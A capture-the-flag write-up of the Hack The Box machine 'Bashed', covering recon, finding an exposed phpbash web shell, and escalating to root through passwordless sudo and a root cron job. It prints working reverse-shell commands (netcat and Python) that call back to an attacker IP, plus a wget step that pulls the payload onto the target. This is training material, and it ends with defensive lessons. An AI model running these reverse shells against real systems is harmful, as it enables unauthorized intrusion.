# Bashed Writeup w/o Metasploit

![](https://miro.medium.com/max/586/1*2mXiaBfDCP6jPMcMpxUG8Q.png)

## Reconnaissance <a id="9596"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.68
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that port 80 is open with Apache HTTP Server running on it.

![](https://miro.medium.com/max/904/1*vVJ-w6P4zwTyQi1kfLDYNg.png)

Before we start investigating port 80, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p1–65535 -oA nmap/full 10.10.10.68
```

We get back the following result. Now we’re sure that port 80 is the only port that is open.

![](https://miro.medium.com/max/914/1*cu-lg6eoZ-wcCIOPzVOqVA.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -oA nmap/udp 10.10.10.68
```

We get back the following result. As can be seen, the top 1000 ports are closed.

![](https://miro.medium.com/max/813/1*pIzrOLKq-fQbkGeUtVMmKQ.png)

Our only avenue of attack is port 80, so let’s check it out.

## Enumeration <a id="ca15"></a>

Head over to [http://10.10.10.68](http://10.10.10.68/) \(defaults to port 80\).

![](https://miro.medium.com/max/1046/1*aXAG-nld0e8Jh9GDCdtUjw.png)

The arrow on the first page leads us to [http://10.10.10.68/single.html](http://10.10.10.68/single.html). There, you can find a link to a GitHub repository explaining that this is a script used to create a semi-interactive web shell. Interesting! If we find the phpbash.php file, we can potentially get a web shell!

![](https://miro.medium.com/max/1015/1*E5N4VTc8XPGhncoNHWeSDg.png)

Let’s do more enumeration on the web server. Run gobuster to enumerate directories.

```text
gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.68
```

* **-t**: number of threads
* **-w**: wordlist
* **-u**: specify the URL
* **dir**: uses directory/file brute forcing mode

The directories _/images_, _/uploads_, _/php_ and _/css_ lead us nowhere. So let’s move on to the _/dev_ directory.

![](https://miro.medium.com/max/856/1*b19auN1AX7gK-psD3_ZfKA.png)

We found the _phpbash.php_ script and clicking on it gives us a web shell!

## Gaining a foothold <a id="b35b"></a>

What exactly does this shell do and in what context does it run?

```text
whoamiiduname -a
```

* _whoami_: print effective userid
* _id_: print real and effective user and group IDs
* _uname -a_: print system information

![](https://miro.medium.com/max/863/1*q4YuzsyXE3obhg__TIRCBw.png)

We’re running in the context of an Apache default user _www-data_. For this machine, we already have a low privileged shell that allows us to run linux commands on the web server, so we don’t necessarily need to get our own reverse shell. However, in a real penetration test, you would place your own shell in the system just in case the creator notices his insecure configuration and takes down the php script. This way you’ll have consistent access to the system by a shell that you control.

Since we’re modelling a real penetration test, let’s get a reverse shell going. In the attack machine \(kali\) set up a listener.

```text
nc -nlvp 4444
```

In the target machine \(bashed\) send a reverse shell to the attack machine.

```text
nc -nv 10.10.14.30 4444 -e /bin/sh
```

Unfortunately, the connection keeps terminating. Let’s try sending a reverse shell in a different way.

P[entestmonkey](http://pentestmonkey.net/) has a comprehensive list of reverse shells. Check if python exists on the target machine.

```text
which python
```

Since we get back a result, python is installed on the machine! Copy the python command from the list and change it to your attack machine’s ip address and listening port.

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Yes! We have a reverse shell going.

![](https://miro.medium.com/max/572/1*Dhh9U-8MkrDDLqwYatscEg.png)

Let’s find the user flag. Change to the home directory and view its contents.

![](https://miro.medium.com/max/689/1*995ncW6rXg-akMu6lKExFw.png)

I have execute privileges on both arrexel and scriptmanager directories. Let’s look in the arrexel directory first.

![](https://miro.medium.com/max/664/1*k0C_W6cozluyc7XbvHB81Q.png)

We found the user flag!

![](https://miro.medium.com/max/754/1*WC5JizLuuWnt-98615olLw.png)

## Privilege Escalation <a id="00cd"></a>

Next, I need to figure out what other privileges I have or can easily get. The following command lists the allowed commands for my user.

![](https://miro.medium.com/max/740/1*gcJPmbEZ5Z-i6_vSm6b-kA.png)

The last two lines are particularly interesting because they say that the user I’m running in the context of \(www-data\) can run as the user scriptmanager without having to provide the user’s password. This might come in handy later on.

For the time being, let’s do some more enumeration.

![](https://miro.medium.com/max/997/1*fMNnau8mZyTE7QqtZ4aHfQ.png)

Everything in the root directory seems to be owned by root except for the **scripts** directory which is owned by scriptmanager. In the previous step we found out that we can run as scriptmanager without a password.

```text
sudo -i -u scriptmanager
```

The above command changes the user to scriptmanager.

![](https://miro.medium.com/max/692/1*BeZT9yzKvHXu8YJaxohz6w.png)

Now that we’re running in the context of scriptmanager, we have read/write/execute privileges in the **scripts** directory.

![](https://miro.medium.com/max/665/1*u5zByyu2IyWFR99zfhFBVw.png)

We have two files; one owned by us \(test.py\) and the other owned by root \(test.txt\). Let’s print out the content of test.py.

![](https://miro.medium.com/max/701/1*toBKYot6VKH19KT-Sb24jw.png)

Interesting! It’s a simple python program that writes to the file test.txt. However, we saw in the previous image that test.txt is running as root! Running the python program also seems to be something that is scheduled since the last access time of the test.txt file is very recent. In fact, the script seems to be executing every minute! It’s probably a cron job that is owned by root.

Why is that great news for us? If I change the contents in the test.py file to send a reverse shell, that reverse shell will run as root!

Changing the file on the shell was unbelievably difficult and glitchy. Therefore, I decided to transfer the file from my attack \(kali\) machine.

In the kali machine, create a test.py file and add the reverse shell code to it.

```text
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.30”,5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
```

Change the file permission to rwx for everyone.

```text
chmod 777 test.py
```

In the same directory, start a simple HTTP server.

```text
python -m SimpleHTTPServer 9005
```

In the target \(bashed\) machine under the **scripts** directory, download the file.

wget [http://10.10.14.30:9005/test.py](http://10.10.14.30:9005/python-reverse-shell.py)

Now, go back to your attack \(kali\) vm and start up a listener with the same port specified in the test.py script.

```text
nc -lnvp 5555
```

Wait for a minute or so for the cron job to execute and voila! We have a shell running as root!

![](https://miro.medium.com/max/585/1*fRXTyuTkIUPS45ALZ6eueQ.png)

Change to the root directory and get the root flag.

![](https://miro.medium.com/max/610/1*5EA5pGAnPd4rI6KJG8uz7Q.png)

## Lessons Learned <a id="5d39"></a>

1. The developer should not have had a web shell that publicly gives access to his system. This one is a no brainer and is probably something you won’t see in real life.
2. Misconfiguring permissions can lead to disastrous consequences. Why was the web daemon user \(www-data\) allowed to become a more privileged user \(scriptmanager\)? Similarly, why was a non-root user created script \(test.py\) executed as root? These are known as security misconfigurations. The developer should have conformed to the principle of least privilege and the concept of separation of privileges.
3. What allowed us to get an initial foothold, is the fact that we found the /dev directory that contained the web shell. I imagine the developer thought no one would find this directory since it is not directly linked on the website. However, gobuster found it in mere minutes. The developer should not have sensitive publicly accessible directories available on his server.

